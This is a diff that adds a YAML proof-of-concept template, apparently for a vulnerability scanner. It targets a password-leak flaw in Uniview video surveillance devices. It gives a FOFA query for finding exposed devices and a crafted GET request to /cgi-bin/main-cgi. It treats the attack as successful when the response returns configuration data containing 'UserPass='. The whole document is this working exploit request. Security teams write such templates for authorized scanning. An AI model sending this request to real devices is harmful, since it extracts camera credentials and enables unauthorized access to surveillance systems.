@@ -1,0 +1,15 @@
+id: poc-yaml-uniview-video-surveillance-main-cgi-information-leak
+info:
+  name: 浙江宇视科技视频监控 main-cgi 密码泄露漏洞
+  severity: high
+  tags:
+  - 信息泄露
+  finger: 宇视科技视频监控
+  fofa: app="uniview-视频监控"
+requests:
+- method: GET
+  path: /cgi-bin/main-cgi?json={%22cmd%22:255,%22szUserName%22:%22%22,%22u32UserLoginHandle%22:-1}
+  expression: status_code == 200 && contains(body,"xml") && contains(body,"UserPass=")
+    && contains(headers,"Config.xml")
+variables: {}
+transport: http
